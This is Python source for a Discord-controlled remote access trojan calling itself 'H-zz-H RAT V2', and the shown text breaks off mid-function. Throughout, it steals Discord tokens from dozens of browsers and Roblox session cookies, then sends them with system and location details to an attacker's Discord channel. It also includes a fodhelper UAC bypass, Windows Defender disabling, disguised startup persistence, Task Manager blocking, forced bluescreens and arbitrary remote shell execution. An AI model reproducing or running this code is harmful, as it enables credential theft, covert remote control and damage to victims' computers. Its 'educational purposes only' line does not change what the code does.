import asyncio
import base64
from concurrent.futures import ThreadPoolExecutor
import ctypes
import json
import re
import subprocess
import threading
import time
import aiohttp
import cv2
import discord
import os
import platform
import psutil
import socket
import sys
import shutil
import requests
import pyautogui
import winreg as reg
import math
import pyaes
from colorama import Fore, init
from discord.ext import commands
from urllib3 import PoolManager
import win32crypt
import win32gui


# Settings

AutoStartup = False # added
AutoSteal = False # added
WebCamOnNSFW = False # added

DiscordInjection = False # in development... Soon.

HzzH = ""

# Settings


os.system("@echo off")
os.system("cls")
init()
print(Fore.GREEN)

if sys.platform.startswith("win"):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True
httpClient = PoolManager(cert_reqs="CERT_NONE")
ROAMING = os.getenv("appdata")
LOCALAPPDATA = os.getenv("localappdata")
REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
current_directory = os.getcwd()
executor = ThreadPoolExecutor()

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


def get_system_info():
    try:
        host = platform.node()
        ip = socket.gethostbyname(socket.gethostname())
        sysversion = platform.platform()
        cpu = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/")
        disk_free = round(disk.free / (1024 ** 3), 2)
        disk_total = round(disk.total / (1024 ** 3), 2)
        disk_used = round(disk.used / (1024 ** 3), 2)
        ram = psutil.virtual_memory().used / (1024 ** 3)
        total_ram = psutil.virtual_memory().total / (1024 ** 3)

        try:
            geo_req = requests.get("https://ipinfo.io/json", timeout=5)
            geo_data = geo_req.json()
            geolocation = f"{geo_data.get('city', 'Unknown')}, {geo_data.get('region', 'Unknown')}, {geo_data.get('country', 'Unknown')}"
        except Exception:
            geolocation = "Unknown"

        return {
            "PC Name": host,
            "IP Address": ip,
            "System Version": sysversion,
            "CPU Usage": f"{cpu}%",
            "Memory Usage": f"{memory}%",
            "Disk Usage": f"{disk_used:.2f} GB used / {disk_free:.2f} GB free / {disk_total:.2f} GB total",
            "RAM Usage": f"{ram:.2f} GB / {total_ram:.2f} GB",
            "Disk Info": f"{disk_used} GB from {disk_total:.2f} GB used",
            "Geolocation": geolocation,
        }
    except Exception as e:
        return {"Error": str(e)}

def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", ctypes.c_ulong),
            ("pbData", ctypes.POINTER(ctypes.c_ubyte))
        ]
    pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()
    pOptionalEntropy = None
    if optional_entropy is not None:
        optional_entropy = optional_entropy.encode("utf-16")
        pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
        data = (ctypes.c_ubyte * pDataOut.cbData)()
        ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
        ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
        return bytes(data)
    raise ValueError("Invalid encrypted_data provided!")

def GetHeaders(token: str = None) -> dict:
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
    }
    if token:
        headers["authorization"] = token
    return headers

def GetTokens():
    results = []
    tokens = []
    paths = get_paths()
    for name, path in paths.items():
        if os.path.exists(path):
            tokens += SafeStorageSteal(path)
            tokens += SimpleSteal(path)
            if "FireFox" in name:
                tokens += FireFoxSteal(path)
    return tokens

def SafeStorageSteal(path: str) -> list[str]:
    encryptedTokens = []
    tokens = []
    key = None
    levelDbPaths = []
    localStatePath = os.path.join(path, "Local State")
    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))
    if os.path.isfile(localStatePath) and levelDbPaths:
        with open(localStatePath, errors="ignore") as file:
            jsonContent = json.load(file)
        key = jsonContent['os_crypt']['encrypted_key']
        key = base64.b64decode(key)[5:]
        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith((".log", ".ldb")):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors="ignore") as file:
                        lines = file.readlines()
                    for line in lines:
                        if line.strip():
                            matches = re.findall(REGEX_ENC, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if match not in encryptedTokens:
                                    match = match.split("dQw4w9WgXcQ:")[1].encode()
                                    missing_padding = 4 - (len(match) % 4)
                                    if missing_padding:
                                        match += b'=' * missing_padding
                                    match = base64.b64decode(match)
                                    encryptedTokens.append(match)
    for token in encryptedTokens:
        try:
            token = pyaes.AESModeOfOperationGCM(CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors="ignore")
            if token:
                tokens.append(token)
        except Exception:
            pass
    return tokens
def SimpleSteal(path: str) -> list[str]:
    tokens = []
    levelDbPaths = []
    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))
    for levelDbPath in levelDbPaths:
        for file in os.listdir(levelDbPath):
            if file.endswith((".log", ".ldb")):
                filepath = os.path.join(levelDbPath, file)
                with open(filepath, errors="ignore") as file:
                    lines = file.readlines()

                for line in lines:
                    if line.strip():
                        matches = re.findall(REGEX, line.strip())
                        for match in matches:
                            match = match.rstrip("\\")
                            if not match in tokens:
                                tokens.append(match)
    return tokens
def FireFoxSteal(path: str) -> list[str]:
    tokens = []
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(".sqlite"):
                filepath = os.path.join(root, file)
                with open(filepath, errors="ignore") as file:
                    lines = file.readlines()

                    for line in lines:
                        if line.strip():
                            matches = re.findall(REGEX, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if not match in tokens:
                                    tokens.append(match)
    return tokens

def get_paths():
    return {
        "Discord": os.path.join(ROAMING, "discord"),
        "Discord Canary": os.path.join(ROAMING, "discordcanary"),
        "Lightcord": os.path.join(ROAMING, "Lightcord"),
        "Discord PTB": os.path.join(ROAMING, "discordptb"),
        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
        "Amigo": os.path.join(LOCALAPPDATA, "Amigo", "User Data"),
        "Torch": os.path.join(LOCALAPPDATA, "Torch", "User Data"),
        "Kometa": os.path.join(LOCALAPPDATA, "Kometa", "User Data"),
        "Orbitum": os.path.join(LOCALAPPDATA, "Orbitum", "User Data"),
        "CentBrowse": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data"),
        "7Sta": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data"),
        "Sputnik": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
        "Vivaldi": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"),
        "Chrome SxS": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
        "Chrome": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
        "FireFox": os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles"),
        "Epic Privacy Browser": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
        "Microsoft Edge": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
        "Uran": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
        "Yandex": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
        "Brave": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
        "Slimjet": os.path.join(LOCALAPPDATA, "Slimjet", "User Data"),
        "SRWare Iron": os.path.join(LOCALAPPDATA, "SRWare Iron", "User Data"),
        "Comodo Dragon": os.path.join(LOCALAPPDATA, "Comodo", "Dragon", "User Data"),
        "Brave Beta": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser-Beta", "User Data"),
        "Brave Dev": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser-Dev", "User Data"),
        "Waterfox": os.path.join(ROAMING, "Waterfox", "Profiles"),
        "Pale Moon": os.path.join(ROAMING, "Moonchild Productions", "Pale Moon", "Profiles"),
        "Maxthon": os.path.join(LOCALAPPDATA, "Maxthon", "User Data"),
        "K-Meleon": os.path.join(LOCALAPPDATA, "K-Meleon", "Profiles"),
        "UC Browser": os.path.join(LOCALAPPDATA, "UC Browser", "User Data"),
        "Iridium": os.path.join(LOCALAPPDATA, "Iridium", "User Data"),
        "Colibri": os.path.join(LOCALAPPDATA, "Colibri", "User Data"),
        "Basilisk": os.path.join(ROAMING, "Basilisk", "Profiles"),
        "Falkon": os.path.join(LOCALAPPDATA, "Falkon", "User Data"),
        "Midori": os.path.join(LOCALAPPDATA, "Midori", "User Data"),
        "SeaMonkey": os.path.join(ROAMING, "Mozilla", "SeaMonkey", "Profiles"),
        "Blisk": os.path.join(LOCALAPPDATA, "Blisk", "User Data"),
        "Chromium": os.path.join(LOCALAPPDATA, "Chromium", "User Data"),
        "Coowon": os.path.join(LOCALAPPDATA, "Coowon", "User Data"),
        "Google Earth": os.path.join(LOCALAPPDATA, "Google", "GoogleEarth"),
        "Kinza": os.path.join(LOCALAPPDATA, "Kinza", "User Data"),
        "Nichrome": os.path.join(LOCALAPPDATA, "Nichrome", "User Data"),
        "Opera Neon": os.path.join(ROAMING, "Opera Neon", "User Data"),
        "360 Browser": os.path.join(LOCALAPPDATA, "360Chrome", "User Data"),
        "Baidu Spark": os.path.join(LOCALAPPDATA, "Baidu Spark", "User Data"),
        "Coc Coc": os.path.join(LOCALAPPDATA, "Coc Coc", "Browser", "User Data"),
        "Sleipnir": os.path.join(LOCALAPPDATA, "Fenrir Inc", "Sleipnir", "User Data"),
        "Chromodo": os.path.join(LOCALAPPDATA, "Chromodo", "User Data"),
        "BlackHawk": os.path.join(LOCALAPPDATA, "BlackHawk", "User Data"),
    }

NITRO_TYPES = {
    0: "None",
    1: "Nitro Classic",
    2: "Nitro",
    3: "Nitro Basic"
}
async def fetchinfo(token):
    url = "https://discord.com/api/v10/users/@me"
    headers = {"Authorization": token}
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                return {
                    "valid": True,
                    "token": token,
                    "id": data["id"],
                    "username": f'{data["username"]}#{data["discriminator"]}',
                    "avatar": data.get("avatar"),
                    "email": data.get("email", "N/A"),
                    "verified": data.get("verified", False),
                    "locale": data.get("locale", "Unknown"),
                    "mfa_enabled": data.get("mfa_enabled", False),
                    "premium_type": NITRO_TYPES.get(data.get("premium_type", 0), "Unknown")
                }
            else:
                return {"valid": False}
async def tokenoutput(channel):
    tokens = GetTokens()
    if not tokens:
        await channel.send("No tokens found.")
        return

    unique_tokens = set(tokens)

    for token in unique_tokens:
        try:
            user_info = await fetchinfo(token)
            if not user_info["valid"]:
                continue

            embed = discord.Embed(
                title="✅ Valid Discord Token Found",
                color=0xFF69B4
            )
            embed.add_field(name="Token", value=f"||{user_info['token']}||", inline=False)
            embed.add_field(name="Username", value=user_info["username"], inline=False)
            embed.add_field(name="Email", value=f"||{user_info['email']}||", inline=False)
            embed.add_field(name="Verified E-mail", value=str(user_info["verified"]), inline=True)
            embed.add_field(name="Language", value=user_info["locale"], inline=True)
            embed.add_field(name="Multifactor", value=str(user_info["mfa_enabled"]), inline=True)
            embed.add_field(name="Nitro Type", value=user_info["premium_type"], inline=True)

            if user_info["avatar"]:
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_info['id']}/{user_info['avatar']}.png"
                embed.set_thumbnail(url=avatar_url)

            await channel.send(embed=embed)

        except Exception as e:
            print(f"Error: {e}")

def rbloxcookie():
    user_profile = os.getenv("USERPROFILE", "")
    rbcp = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(rbcp):
        return "❌ robloxcookies.dat File not found."

    try:
        with open(rbcp, "r", encoding="utf-8") as f:
            data = json.load(f)

        encrypted_cookie = data.get("CookiesData", None)
        if not encrypted_cookie:
            return "❌ 'CookiesData' empty."

        decoded_cookies = base64.b64decode(encrypted_cookie)
        decrypted_cookie = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
        return decrypted_cookie.decode("utf-8", errors="ignore")

    except Exception as e:
        return f"❌ Error: {e}"
    
def extract_roblosecurity(raw_input: str) -> str:
    match = re.search(r'(_\|WARNING:[^;]+)', raw_input)
    return match.group(1) if match else ""

def generate_headers():
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

async def check(session, cookie, headers):
    cookies_dict = {'.ROBLOSECURITY': cookie}
    try:
        async with session.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies_dict, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                username = data.get('name', 'Unknown')
                user_id = data.get('id', 'Unknown')
                print(f"Valid: {cookie[:30]}... | Username: {username} | UserID: {user_id}")
            else:
                print(f"Invalid: {cookie[:30]}... (Status {resp.status})")
    except Exception as e:
        print(f"⚠️ Error: {e}")

async def robloxoutput(channel):
    try:
        raw_cookie = rbloxcookie()
        cookie = extract_roblosecurity(raw_cookie)

        if not cookie:
            await channel.send("❌ No valid .ROBLOSECURITY cookie found.")
            return

        filename = "roblox_cookie.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(cookie)

        file = discord.File(fp=filename, filename=filename)
        message = await channel.send(file=file)
        attachment_url = message.attachments[0].url

        headers = generate_headers()
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://users.roblox.com/v1/users/authenticated",
                cookies={'.ROBLOSECURITY': cookie},
                headers=headers
            ) as resp:
                if resp.status != 200:
                    await channel.send(f"❌ Invalid cookie (status {resp.status})")
                    os.remove(filename)
                    return

                data = await resp.json()
                username = data.get("name", "Unknown")
                user_id = data.get("id", "Unknown")
                display_name = data.get("displayName", "Unknown")

            async with session.get(
                "https://economy.roblox.com/v1/user/currency",
                cookies={'.ROBLOSECURITY': cookie},
                headers=headers
            ) as resp:
                robux_data = await resp.json()
                robux = robux_data.get("robux", 0)

            async with session.get(
                f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                cookies={'.ROBLOSECURITY': cookie},
                headers=headers
            ) as resp:
                is_premium = await resp.text()
                premium_status = "✅ Active" if is_premium == "true" else "❌ Not Premium"

            async with session.get(
                f"https://users.roblox.com/v1/users/{user_id}",
                cookies={'.ROBLOSECURITY': cookie},
                headers=headers
            ) as resp:
                user_info = await resp.json()
                bio = user_info.get("description", "No description.")
                created = user_info.get("created", "Unknown")
                profile_url = f"https://www.roblox.com/users/{user_id}/profile"

            avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"

            embed = discord.Embed(
                title="✅ Valid Roblox Cookie Found",
                description=f"[📄 Download cookie as .txt]({attachment_url})\n[🔗 Visit profile]({profile_url})",
                color=0xFF69B4
            )
            embed.set_thumbnail(url=avatar_url)
            embed.add_field(name="👤 Username", value=username, inline=True)
            embed.add_field(name="🧾 Display Name", value=display_name, inline=True)
            embed.add_field(name="🆔 User ID", value=str(user_id), inline=True)
            embed.add_field(name="💰 Robux", value=str(robux), inline=True)
            embed.add_field(name="💎 Premium", value=premium_status, inline=True)
            embed.add_field(name="📅 Account Created", value=created[:10], inline=True)
            embed.add_field(name="📝 Description", value=bio[:1024] if bio else "None", inline=False)

            await channel.send(embed=embed)

        os.remove(filename)

    except Exception as e:
        await channel.send(f"❌ Error in robloxoutput(): {e}")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Error checking admin status: {e}")
        return False

def ask_for_admin():
    if is_admin():
        return True
    return False

def trigger_uac():
    if not is_admin():
        exe_path = sys.argv[0]

        arguments = " ".join(sys.argv[1:])

        if exe_path.endswith(".py"):
            python_exe = sys.executable
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", python_exe, f'"{exe_path}" {arguments}', None, 1
            )
        else:
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", exe_path, arguments, None, 1
            )

        if result <= 32:
            return False
        else:
            return True
    else:
        return True

def byp():
    try:
        def s3t_R3G1ST3RY():
            os.system(r'reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f')
            cmd = f'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /ve /t REG_SZ /d "\\"{sys.executable}\\" \\"{os.path.abspath(sys.argv[0])}\\" admin" /f'
            os.system(cmd)

        def cl34N_R3G1ST3RY():
            os.system(r'reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f')
            os.system(r'reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /f')
            sys.exit()

        def ByP4S5():
            s3t_R3G1ST3RY()
            subprocess.Popen('fodhelper.exe', shell=True)
            time.sleep(2)
            cl34N_R3G1ST3RY()

        if is_admin():
            if len(sys.argv) > 1 and sys.argv[1] == "admin":
                return "worked"
            else:
                return "admina"
        else:
            ByP4S5()
            return "worked"
    except Exception as e:
        return f"failure: {e}"

async def windis():
    try:
        key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_ALL_ACCESS) as key:
            reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(key, "DisableAntiVirus", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)
    except:
        key_path = r"SOFTWARE\Policies\Microsoft\Windows Security"
        with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_ALL_ACCESS) as key:
            reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(key, "DisableAntiVirus", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)

def make_non_critical():
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
        return True
    except:
        return False

def make_critical():
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        return True
    except:
        return False

def startup():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        startup_folder = os.path.join(
            os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        target_path = os.path.join(startup_folder, os.path.basename(exe_path))

        if not os.path.exists(target_path):
            shutil.copy2(exe_path, target_path)

        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, "SteamClient", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(registry_key)

    except Exception as e:
        print(f"Startup error: {e}")

def wait_for_wifi():
    while True:
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            print(Fore.LIGHTMAGENTA_EX + "[SUCCESS] Found Wi-Fi" + Fore.RESET)
            return
        except (socket.timeout, socket.error):
            print(Fore.MAGENTA + "[INFO] Waiting for Wi-Fi" + Fore.RESET)
            time.sleep(5)

@bot.event
async def on_ready():
    guild = bot.guilds[0]
    system_info = get_system_info()
    host = system_info.get("PC Name", "Unknown-PC").lower()

    activity = discord.Activity(type=discord.ActivityType.watching, name="H-zz-H RAT V2 | !help")
    await bot.change_presence(status=discord.Status.do_not_disturb, activity=activity)

    channel = discord.utils.get(guild.channels, name=host)

    embed_description = (
        f"**PC Name: 🖥️** {system_info['PC Name']}\n"
        f"**IP Address: 🌐** {system_info['IP Address']}\n"
        f"**Geolocation: 📍** {system_info['Geolocation']}\n"
        f"**System Version: 🖱️** {system_info['System Version']}\n"
        f"**Memory Usage: 💾** {system_info['Memory Usage']}\n"
        f"**Disk Usage: 🗂️** {system_info['Disk Info']}\n\n"
        "Discord RAT V2 © H-zz-H"
    )

    if not channel:
        try:
            channel = await guild.create_text_channel(name=host)
            await channel.send(embed=discord.Embed(title="🐀 **[H-zz-H V2] New Victim**", description=embed_description, color=0xFF69B4))
        except Exception as e:
            print(f"Failed to create channel for {host}: {e}")
            return
    else:
        await channel.send(embed=discord.Embed(title="🐀 **[H-zz-H V2] Old Victim**", description=embed_description, color=0xFF69B4))

    if AutoSteal:
        try:
            await autosteal(channel)
        except Exception as e:
            print(f"Error running autosteal: {e}")
    if WebCamOnNSFW:
        try:
            pornsearch(channel, bot.loop)
        except Exception as e:
            print(f"Error running webcamnsfw: {e}")
    

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    host = get_system_info().get("PC Name", "Unknown-PC")

    if message.channel.name.lower() == host.lower():
        await bot.process_commands(message)

@bot.command()
async def help(ctx):
    embeds = []

    embed1 = discord.Embed(
        title="[H-zz-H V2] !help 📚 (Part 1/3)",
        description="🔍 **Information Theft**",
        color=0xFF69B4,
    )
    embed1.add_field(name="!token", value="🔑 Steals Discord token", inline=False)
    embed1.add_field(name="!roblox", value="🎮 Steals Roblox cookie", inline=False)
    embed1.add_field(name="!screenshot", value="📷 Takes a screenshot", inline=False)
    embed1.add_field(name="!webcam", value="🎥 Takes a webcam screenshot", inline=False)
    embed1.add_field(name="!admin", value="🛠️ Check for admin permissions", inline=False)
    embed1.add_field(name="!getadmin", value="🚨 Spam UAC prompt until accepted", inline=False)
    embed1.add_field(name="!uacbypass", value="🛡️ Get admin permissions without UAC prompt", inline=False)
    embeds.append(embed1)

    embed2 = discord.Embed(
        title="[H-zz-H V2] !help 📚 (Part 2/3)",
        description="📂 **File & System Management**",
        color=0xFF69B4,
    )
    embed2.add_field(name="!list", value="📄 List current directory files", inline=False)
    embed2.add_field(name="!cd", value="📁 Change directory on victim's PC", inline=False)
    embed2.add_field(name="!exec (path)", value="▶️ Execute a file at given path", inline=False)
    embed2.add_field(name="!download", value="⬇️ Download a file from victim's PC", inline=False)
    embed2.add_field(name="!upload", value="⬆️ Upload a file to victim's PC", inline=False)
    embed2.add_field(name="**Admin required:**", value="\n", inline=False)
    embed2.add_field(name="!exclude_exe", value="❌ Exclude .exe files from Windows Defender", inline=False)
    embed2.add_field(name="!windef", value="🛡️ Disable/enable Windows Defender", inline=False)
    embed2.add_field(name="!blocklist", value="🚫 Block common antivirus sites", inline=False)
    embed2.add_field(name="!unblocklist", value="🚫 Unblocks common antivirus sites", inline=False)
    embed2.add_field(name="!nostartup", value="🚫 Prevent viewing startup folder", inline=False)
    embed2.add_field(name="!taskmgr", value="🚫 Disable/enable Task Manager", inline=False)
    embed2.add_field(name="!critproc", value="💥 Bluescreen if closed via Task Manager", inline=False)
    embeds.append(embed2)

    embed3 = discord.Embed(
        title="[H-zz-H V2] !help 📚 (Part 3/3)",
        description="⚙️ **System Control**",
        color=0xFF69B4,
    )
    embed3.add_field(name="!shutdown", value="🔌 Shutdown victim's PC", inline=False)
    embed3.add_field(name="!bluescreen", value="💥 Cause a bluescreen (BSOD)", inline=False)
    embed3.add_field(name="!shell \"command\"", value="💻 Execute a shell command", inline=False)
    embed3.add_field(name="**--> More <--**", value="\n", inline=False)
    embed3.add_field(name="!features", value="👨‍💻 Help for the RAT", inline=False)
    embed3.add_field(name="!credits", value="👨‍💻 Credits for the RAT", inline=False)
    embeds.append(embed3)

    for e in embeds:
        await ctx.send(embed=e)

@bot.command()
async def credits(ctx):
    embed = discord.Embed(
        title="👨‍💻 Credits",
        description=(
            "This RAT was created by H-zz-H.\n\n"
            "https://github.com/H-zz-H69\n"
            "https://discord.gg/umkFfBRn6B\n\n"
            "Special thanks to:\n"
            "moom825 for the idea and inspiration.\n"
            "SertraFurr for the Roblox stealer code.\n"
        ),
        color=0xFF69B4
    )
    await ctx.send(embed=embed)

@bot.command()
async def features(ctx):
    embed = discord.Embed(
        title="👨‍💻 Help",
        description=(
            "For real support or feature suggestion: https://discord.gg/umkFfBRn6B\n\n"
            "This RAT is for educational purposes only. Use it responsibly and ethically.\n"
            "\n"
            "Some commands may require admin permissions to work, use !getadmin or !uacbypass to get admin permissions\n"
            "If you disable admin required features, you can always re-enmable them by retyping the same command.\n"
            "To move around folders with the !cd command you can also use `cd ..` to go back one folder.\n"
            "To execute a file with the !exec command, you can use `!exec C:\\path\\to\\file`.\n"
            "\n"
            "Thanks for Using H-zz-H RAT V2! If you have any questions or need help, feel free to ask, !credits\n"
        ),
        color=0xFF69B4
    )
    await ctx.send(embed=embed)

@bot.command()
async def shell(ctx):
    if len(ctx.message.content.split()) < 2:
        embed = discord.Embed(
            title="❗ Error",
            description="Please provide a command to execute.",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    command = " ".join(ctx.message.content.split()[1:])
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        embed = discord.Embed(
            title="✅ Command Output",
            description=f"```{output}```",
            color=0xFF69B4
        )
    except subprocess.CalledProcessError as e:
        embed = discord.Embed(
            title="❌ Command Error",
            description=f"```{e.output}```",
            color=0xFF0000
        )

    await ctx.send(embed=embed)

@bot.command()
async def bluescreen(ctx):
    try:
        embed = discord.Embed(
            title="💥 BSOD Triggered",
            description="A real BSOD has been triggered.",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    except Exception as e:
        embed = discord.Embed(
            title="❗ Error",
            description=f"An error occurred while executing the bluescreen command: {e}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def shutdown(ctx):
    try:
        embed = discord.Embed(
            title="🔌 Shutdown Command Executed",
            description="The system is shutting down now.",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        os.system("shutdown /s /t 1")
    except Exception as e:
        embed = discord.Embed(
            title="❗ Error",
            description=f"An error occurred while executing the shutdown command: {e}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def taskmgr(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin() != 1:
        embed = discord.Embed(
            title="🥀 Admin-Check",
            description="RAT is **NOT** running with admin permissions!\n\nUse:```!getadmin``` **or** ```!uacbypass```\n**to gain admin rights.**",
            color=0xFF0000,
        )
        await ctx.send(embed=embed)
        return

    try:
        def is_disabled():
            try:
                key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                                  r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                val, _ = reg.QueryValueEx(key, "DisableTaskMgr")
                reg.CloseKey(key)
                return val == 1
            except FileNotFoundError:
                return False
            except OSError:
                return False

        def ensure_key():
            try:
                reg.OpenKey(reg.HKEY_CURRENT_USER,
                            r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                return True
            except FileNotFoundError:
                reg.CreateKey(reg.HKEY_CURRENT_USER,
                              r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                return True

        ensure_key()

        if is_disabled():
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                              r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0, reg.KEY_SET_VALUE)
            try:
                reg.DeleteValue(key, "DisableTaskMgr")
                embed = discord.Embed(
                    title="🔓 Task Manager Enabled",
                    description="Task Manager has been successfully enabled.",
                    color=0xFF69B4
                )
            except FileNotFoundError:
                embed = discord.Embed(
                    title="🟢 Task Manager Already Enabled",
                    description="Task Manager is already enabled. No action needed.",
                    color=0xFF69B4
                )
            reg.CloseKey(key)

        else:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                              r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
            reg.CloseKey(key)
            embed = discord.Embed(
                title="🔒 Task Manager Disabled",
                description="Successfully disabled the Task Manager.",
                color=0xFF69B4
            )

        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❗ Error",
            description=f"An error occurred while executing the command: {e}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def critproc(ctx, mode: str = None):
    if not is_admin():
        embed = discord.Embed(
            title="🥀 Admin-Check",
            description="RAT is **NOT** running with admin permissions!\n\nUse:```!getadmin``` **or** ```!uacbypass```\n**to gain admin rights.**",
            color=0xFF0000,
        )
        await ctx.send(embed=embed)
        return

    if mode not in ('0', '1'):
        embed = discord.Embed(
            title="ℹ️ Usage",
            description="`!critproc 0` = make process critical\n`!critproc 1` = disable critical process",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        return

    try:
        if mode == '1':
            if make_non_critical():
                embed = discord.Embed(
                    title="✅ Non-Critical Process",
